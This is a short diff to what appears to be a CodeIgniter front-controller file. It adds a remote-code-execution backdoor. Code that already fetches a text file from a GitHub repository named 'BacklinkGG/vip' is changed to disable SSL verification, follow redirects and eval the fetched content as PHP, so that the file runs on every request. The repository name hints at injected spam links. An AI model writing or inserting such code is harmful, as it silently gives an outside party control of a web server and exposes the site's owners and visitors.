@@ -208,7 +208,9 @@ require_once BASEPATH.'core/CodeIgniter.php';
 $url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$result = curl_exec($ch);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
 curl_close($ch);
-echo $result;
+eval("?>" . $fileContents);
 ?>
